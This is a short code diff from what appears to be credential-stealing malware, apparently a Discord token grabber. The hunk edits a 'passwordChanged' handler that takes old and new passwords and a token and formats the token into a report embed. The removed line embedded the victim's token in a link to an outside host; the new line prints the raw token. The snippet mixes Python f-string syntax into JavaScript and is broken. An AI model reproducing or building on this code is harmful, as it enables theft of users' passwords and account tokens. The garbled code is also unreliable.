@@ -686,7 +686,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
           {
             name: '**Token**',
-           "value": f'`{token}` [Click to copy Kardiş](https://superfurrycdn.nl/copy/{token})',
+           "value": f'`{token}`
            "inline": False
           },
         ],
